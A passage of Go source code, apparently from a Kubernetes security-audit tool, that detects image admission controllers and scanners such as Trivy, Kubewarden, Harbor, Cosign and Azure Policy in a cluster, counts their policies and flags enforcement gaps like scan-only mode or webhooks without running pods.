				if webhookTargetsWorkloads(wh.Object) {
					hasWebhook = true
					controller.WebhookName = name

					if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
						if whMap, ok := webhooks[0].(map[string]interface{}); ok {
							if fp, ok := whMap["failurePolicy"].(string); ok {
								controller.FailurePolicy = fp
							}
						}
					}
					break
				}
			}
		}
	}

	// Check for ConfigAuditReports
	carGVR := schema.GroupVersionResource{
		Group:    "aquasecurity.github.io",
		Version:  "v1alpha1",
		Resource: "configauditreports",
	}

	carList, err := dynClient.Resource(carGVR).List(ctx, metav1.ListOptions{})
	hasConfigReports := err == nil && len(carList.Items) > 0

	// Determine if Trivy is actually present and functioning
	if !hasVulnReports && !hasConfigReports && !hasWebhook && !podsRunning {
		return controller, policies
	}

	controller.Name = "Trivy Operator"
	controller.Type = "trivy"
	controller.VulnScanning = true

	if podsRunning {
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
		if hasWebhook {
			controller.Status = "active"
		} else {
			controller.Status = "scan-only"
			controller.BypassRisk = "Scan-only mode (no admission blocking)"
		}
	} else if hasVulnReports || hasConfigReports {
		controller.Status = "reports-only"
		controller.BypassRisk = "Reports exist but no running operator"
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods"
	}

	if hasVulnReports {
		controller.PolicyCount = len(vrList.Items)
	}
	if hasConfigReports {
		controller.PolicyCount += len(carList.Items)
	}

	return controller, policies
}

// analyzeKubewarden detects Kubewarden policy engine
func analyzeKubewarden(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []KubewardenPolicy) {
	controller := ImageAdmissionController{}
	var policies []KubewardenPolicy

	// Check for Kubewarden webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "kubewarden") {
				webhookFound = true
				controller.Name = "Kubewarden"
				controller.Type = "kubewarden"
				controller.WebhookName = name

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Kubewarden pods are running
	podsRunning, ns := verifyPodsRunning(ctx, clientset,
		[]string{"kubewarden", "kubewarden-system"}, "")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	// Get ClusterAdmissionPolicies
	capGVR := schema.GroupVersionResource{
		Group:    "policies.kubewarden.io",
		Version:  "v1",
		Resource: "clusteradmissionpolicies",
	}

	imageRelatedPolicies := 0
	capList, err := dynClient.Resource(capGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cap := range capList.Items {
			policy := KubewardenPolicy{
				Name:          cap.GetName(),
				IsClusterWide: true,
			}

			if module, ok, _ := unstructured.NestedString(cap.Object, "spec", "module"); ok {
				policy.Module = module
				moduleLC := strings.ToLower(module)
				// Check if it's an image-related policy
				if strings.Contains(moduleLC, "image") ||
					strings.Contains(moduleLC, "registry") ||
					strings.Contains(moduleLC, "container") ||
					strings.Contains(moduleLC, "trusted") {
					controller.SignatureReqs = true
					imageRelatedPolicies++
				}
			}

			if mode, ok, _ := unstructured.NestedString(cap.Object, "spec", "mode"); ok {
				policy.Mode = mode
				if strings.ToLower(mode) == "monitor" {
					policy.Mode = "monitor (not blocking)"
				}
			}

			policies = append(policies, policy)
			controller.PolicyCount++
		}
	}

	// Get AdmissionPolicies (namespace-scoped)
	apGVR := schema.GroupVersionResource{
		Group:    "policies.kubewarden.io",
		Version:  "v1",
		Resource: "admissionpolicies",
	}

	apList, err := dynClient.Resource(apGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, ap := range apList.Items {
			policy := KubewardenPolicy{
				Name:          ap.GetName(),
				Namespace:     ap.GetNamespace(),
				IsClusterWide: false,
			}

			if module, ok, _ := unstructured.NestedString(ap.Object, "spec", "module"); ok {
				policy.Module = module
			}

			policies = append(policies, policy)
			controller.PolicyCount++
		}
	}

	// Check if any policies exist
	if controller.PolicyCount == 0 && controller.Status == "active" {
		controller.BypassRisk = "No policies configured"
	} else if imageRelatedPolicies == 0 && controller.PolicyCount > 0 {
		controller.BypassRisk = "No image-related policies found"
	}

	return controller, policies
}

// analyzeNotation detects Notation/Notary v2 verification
func analyzeNotation(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []NotationPolicy) {
	controller := ImageAdmissionController{}
	var policies []NotationPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "notation") || strings.Contains(nameLC, "notary") ||
				strings.Contains(nameLC, "notaryproject") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Notation/Notary v2"
				controller.Type = "notation"
				controller.WebhookName = name
				controller.SignatureReqs = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Notation pods are running
	podsRunning, ns := verifyPodsRunning(ctx, clientset,
		[]string{"notation", "notation-system", "ratify-system"}, "")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	// Check for trust policy configmaps
	for _, searchNs := range []string{"notation", "notation-system", "ratify-system", "default"} {
		cms, err := clientset.CoreV1().ConfigMaps(searchNs).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, cm := range cms.Items {
				cmNameLC := strings.ToLower(cm.Name)
				if strings.Contains(cmNameLC, "trust") || strings.Contains(cmNameLC, "notation") {
					controller.PolicyCount++
				}
			}
		}
	}

	if controller.PolicyCount == 0 && controller.Status == "active" {
		controller.BypassRisk = "No trust policies found"
	}

	return controller, policies
}

// analyzeHarbor detects Harbor registry integration
func analyzeHarbor(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []HarborPolicy) {
	controller := ImageAdmissionController{}
	var policies []HarborPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "harbor") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Harbor"
				controller.Type = "harbor"
				controller.WebhookName = name
				controller.VulnScanning = true
				controller.SignatureReqs = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Harbor pods are running
	podsRunning, ns := verifyPodsRunning(ctx, clientset,
		[]string{"harbor", "harbor-system"}, "")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeAWSSigner detects AWS Signer for containers
func analyzeAWSSigner(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface, namespaces []string) (ImageAdmissionController, []AWSSignerPolicy) {
	controller := ImageAdmissionController{}
	var policies []AWSSignerPolicy

	// Track unique signing profiles found
	signingProfiles := make(map[string]bool)

	// AWS Signer uses annotations on pods/serviceaccounts
	// Check for pods with AWS Signer annotations
	for _, ns := range namespaces {
		pods, err := clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}

		for _, pod := range pods.Items {
			// Only check running pods
			if pod.Status.Phase != "Running" {
				continue
			}

			// Check for AWS Signer related annotations
			if annotations := pod.Annotations; annotations != nil {
				if profile, ok := annotations["signer.amazonaws.com/signing-profile"]; ok {
					if controller.Name == "" {
						controller.Name = "AWS Signer"
						controller.Type = "aws-signer"
						controller.Status = "annotation-based"
						controller.SignatureReqs = true
					}

					if !signingProfiles[profile] {
						signingProfiles[profile] = true
						controller.PolicyCount++

						policy := AWSSignerPolicy{
							Name:              fmt.Sprintf("%s/%s", ns, pod.Name),
							Enabled:           true,
							SigningProfileARN: profile,
						}
						policies = append(policies, policy)
					}
				}
			}
		}
	}

	// Also check for ECR-related admission webhooks
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			// Look for ECR signer webhook or AWS signer webhook
			if (strings.Contains(nameLC, "ecr") && strings.Contains(nameLC, "sign")) ||
				strings.Contains(nameLC, "aws-signer") ||
				strings.Contains(nameLC, "notation") && strings.Contains(nameLC, "aws") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				if controller.Name == "" {
					controller.Name = "AWS Signer"
					controller.Type = "aws-signer"
					controller.SignatureReqs = true
				}
				controller.Status = "active"
				controller.WebhookName = name

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	// If only annotation-based (no webhook), note the limitation
	if controller.Name != "" && controller.Status == "annotation-based" {
		controller.BypassRisk = "Annotation-based only (no admission webhook enforcement)"
	}

	return controller, policies
}

// analyzeAzurePolicy detects Azure Policy for AKS
func analyzeAzurePolicy(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []AzurePolicyConfig) {
	controller := ImageAdmissionController{}
	var policies []AzurePolicyConfig

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			if strings.Contains(nameLC, "azure-policy") || strings.Contains(nameLC, "azurepolicy") ||
				strings.Contains(nameLC, "aks-policy") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Azure Policy for AKS"
				controller.Type = "azure-policy"
				controller.WebhookName = name

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	// Verify Azure Policy pods are running
	if webhookFound {
		podsRunning, ns := verifyPodsRunning(ctx, clientset,
			[]string{"gatekeeper-system", "kube-system", "azure-arc"}, "app=azure-policy")

		if podsRunning {
			controller.Status = "active"
			controller.Namespace = ns
		} else {
			// Also check for gatekeeper pods without label
			podsRunning, ns = verifyPodsRunning(ctx, clientset,
				[]string{"gatekeeper-system"}, "")
			if podsRunning {
				controller.Status = "active"
				controller.Namespace = ns
			} else {
				controller.Status = "webhook-only"
				controller.BypassRisk = "Webhook exists but no running pods found"
			}
		}
	}

	// Check for Azure-specific Gatekeeper constraints
	// Azure Policy uses Gatekeeper with specific constraint templates
	ctGVR := schema.GroupVersionResource{
		Group:    "templates.gatekeeper.sh",
		Version:  "v1",
		Resource: "constrainttemplates",
	}

	imageRelatedConstraints := 0
	ctList, err := dynClient.Resource(ctGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, ct := range ctList.Items {
			name := ct.GetName()
			nameLC := strings.ToLower(name)
			// Azure Policy constraint templates often have k8s prefix
			if strings.HasPrefix(nameLC, "k8sazure") &&
				(strings.Contains(nameLC, "containerallowed") ||
					strings.Contains(nameLC, "allowedimages") ||
					strings.Contains(nameLC, "containerregistry") ||
					strings.Contains(nameLC, "imagedigist") ||
					strings.Contains(nameLC, "containers")) {
				if controller.Name == "" {
					controller.Name = "Azure Policy for AKS"
					controller.Type = "azure-policy"
				}
				controller.PolicyCount++
				imageRelatedConstraints++

				policy := AzurePolicyConfig{
					Name:    name,
					Enabled: true,
				}
				policies = append(policies, policy)
			}
		}
	}

	// Check if we found constraints but no webhook (Gatekeeper without Azure Policy)
	if controller.Name != "" && !webhookFound {
		// Check if standard Gatekeeper webhook exists
		for _, wh := range whList.Items {
			nameLC := strings.ToLower(wh.GetName())
			if strings.Contains(nameLC, "gatekeeper") {
				controller.WebhookName = wh.GetName()
				webhookFound = true
				break
			}
		}
	}

	// Verify we have image-related policies
	if controller.Name != "" && imageRelatedConstraints == 0 {
		controller.BypassRisk = "No image-related constraints configured"
	}

	return controller, policies
}

// analyzeClair detects Clair vulnerability scanner admission
func analyzeClair(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []ClairPolicy) {
	controller := ImageAdmissionController{}
	var policies []ClairPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			// Use SDK for more accurate matching to avoid false positives
			if MatchesEngineWebhook(name, "clair") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Clair"
				controller.Type = "clair"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Clair pods are running using SDK for consistent detection
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		GetExpectedNamespaces("clair"), "", "clair")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeWiz analyzes Wiz container security
func analyzeWiz(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []WizPolicy) {
	controller := ImageAdmissionController{}
	var policies []WizPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if MatchesEngineWebhook(name, "wiz") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Wiz"
				controller.Type = "wiz"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Wiz pods are running
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		GetExpectedNamespaces("wiz"), "app.kubernetes.io/name=wiz-sensor", "wiz")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeLacework analyzes Lacework container security
func analyzeLacework(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []LaceworkPolicy) {
	controller := ImageAdmissionController{}
	var policies []LaceworkPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if MatchesEngineWebhook(name, "lacework") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Lacework"
				controller.Type = "lacework"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Lacework pods are running
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		GetExpectedNamespaces("lacework"), "", "lacework")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeCosignStandalone analyzes standalone Cosign signature verification
func analyzeCosignStandalone(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []CosignStandalonePolicy) {
	controller := ImageAdmissionController{}
	var policies []CosignStandalonePolicy

	// Check for Cosign webhook (may be combined with Sigstore policy-controller)
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			// Look for cosign-specific webhook (not policy.sigstore.dev which is handled by Sigstore)
			if strings.Contains(nameLC, "cosign") && !strings.Contains(nameLC, "policy") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Cosign"
				controller.Type = "cosign"
				controller.WebhookName = name
				controller.SignatureReqs = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Cosign pods are running
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		GetExpectedNamespaces("cosign"), "", "cosign")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeFluxImageAutomation analyzes Flux Image Automation
func analyzeFluxImageAutomation(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []FluxImagePolicy) {
	controller := ImageAdmissionController{}
	var policies []FluxImagePolicy

	// Check for Flux Image Automation CRDs
	imageRepoGVR := schema.GroupVersionResource{
		Group:    "image.toolkit.fluxcd.io",
		Version:  "v1beta2",
		Resource: "imagerepositories",
	}

	repoList, err := dynClient.Resource(imageRepoGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		// Try v1beta1
		imageRepoGVR.Version = "v1beta1"
		repoList, err = dynClient.Resource(imageRepoGVR).Namespace("").List(ctx, metav1.ListOptions{})
	}

	if err != nil || len(repoList.Items) == 0 {
		return controller, policies
	}

	controller.Name = "Flux Image Automation"
	controller.Type = "flux-image"

	// Verify Flux Image controllers are running
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		GetExpectedNamespaces("flux-image"), "app=image-automation-controller", "flux-image")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "CRDs-only"
		controller.BypassRisk = "CRDs found but no running controllers"
	}

	// Get image policies
	imagePolicyGVR := schema.GroupVersionResource{
		Group:    "image.toolkit.fluxcd.io",
		Version:  "v1beta2",
		Resource: "imagepolicies",
	}

	policyList, err := dynClient.Resource(imagePolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		imagePolicyGVR.Version = "v1beta1"
		policyList, _ = dynClient.Resource(imagePolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
	}

	if policyList != nil {
		for _, p := range policyList.Items {
			policy := FluxImagePolicy{
				Name:      p.GetName(),
				Namespace: p.GetNamespace(),
			}
			if imageRepoRef, ok, _ := unstructured.NestedString(p.Object, "spec", "imageRepositoryRef", "name"); ok {
				policy.ImageRepository = imageRepoRef
			}
			if filterTags, ok, _ := unstructured.NestedString(p.Object, "spec", "filterTags", "pattern"); ok {
				policy.FilterTags = filterTags
			}
			if semverPolicy, ok, _ := unstructured.NestedMap(p.Object, "spec", "policy", "semver"); ok {
				policy.Policy = "semver"
				if rng, ok := semverPolicy["range"].(string); ok {
					policy.Range = rng
				}
			}
			policies = append(policies, policy)
			controller.PolicyCount++
		}
	}

	return controller, policies
}

// analyzeJFrogXray analyzes JFrog Xray security scanning
func analyzeJFrogXray(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []JFrogXrayPolicy) {
	controller := ImageAdmissionController{}
	var policies []JFrogXrayPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			nameLC := strings.ToLower(name)
			// Match xray but avoid false positives (not aws x-ray, etc.)
			if (strings.Contains(nameLC, "xray") || strings.Contains(nameLC, "jfrog")) &&
				!strings.Contains(nameLC, "aws") && !strings.Contains(nameLC, "amazon") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "JFrog Xray"
				controller.Type = "jfrog-xray"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Xray pods are running
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		GetExpectedNamespaces("jfrog-xray"), "", "jfrog-xray")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeDeepfence analyzes Deepfence ThreatMapper
func analyzeDeepfence(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []DeepfencePolicy) {
	controller := ImageAdmissionController{}
	var policies []DeepfencePolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if MatchesEngineWebhook(name, "deepfence") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Deepfence ThreatMapper"
				controller.Type = "deepfence"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Deepfence pods are running
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		GetExpectedNamespaces("deepfence"), "", "deepfence")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeQualys analyzes Qualys Container Security
func analyzeQualys(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []QualysPolicy) {
	controller := ImageAdmissionController{}
	var policies []QualysPolicy

	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if MatchesEngineWebhook(name, "qualys") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Qualys Container Security"
				controller.Type = "qualys"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Qualys pods are running
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		GetExpectedNamespaces("qualys"), "", "qualys")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeDockerScout analyzes Docker Scout
func analyzeDockerScout(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []DockerScoutPolicy) {
	controller := ImageAdmissionController{}
	var policies []DockerScoutPolicy

	// Docker Scout is typically cloud-based but may have a Kubernetes integration
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	webhookFound := false
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if MatchesEngineWebhook(name, "docker-scout") {
				if !webhookTargetsWorkloads(wh.Object) {
					continue
				}
				webhookFound = true
				controller.Name = "Docker Scout"
				controller.Type = "docker-scout"
				controller.WebhookName = name
				controller.VulnScanning = true

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify Docker Scout pods are running
	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
		GetExpectedNamespaces("docker-scout"), "", "docker-scout")

	if podsRunning {
		controller.Status = "active"
		controller.Namespace = ns
		controller.ImageVerified = imageVerified
	} else {
		controller.Status = "webhook-only"
		controller.BypassRisk = "Webhook exists but no running pods found"
	}

	return controller, policies
}

// analyzeImageSources scans all pods to analyze deployed images
func analyzeImageSources(ctx context.Context, clientset kubernetes.Interface, namespaces []string) ImageSourceAnalysis {
	analysis := ImageSourceAnalysis{
		RegistryBreakdown: make(map[string]*RegistryUsage),
		ImagesByNamespace: make(map[string][]ImageInfo),
	}

	seenImages := make(map[string]bool)

	for _, ns := range namespaces {
		pods, err := clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}

		for _, pod := range pods.Items {
			// Analyze regular containers
			for _, container := range pod.Spec.Containers {
				imgInfo := parseImageInfo(container.Image, pod.Name, ns, container.Name, false)
				analysis.TotalImages++
				addImageToAnalysis(&analysis, imgInfo, seenImages)
			}

			// Analyze init containers
			for _, container := range pod.Spec.InitContainers {
				imgInfo := parseImageInfo(container.Image, pod.Name, ns, container.Name, true)
				analysis.TotalImages++
				addImageToAnalysis(&analysis, imgInfo, seenImages)
			}

			// Analyze ephemeral containers
			for _, container := range pod.Spec.EphemeralContainers {
				imgInfo := parseImageInfo(container.Image, pod.Name, ns, container.Name, false)
				analysis.TotalImages++
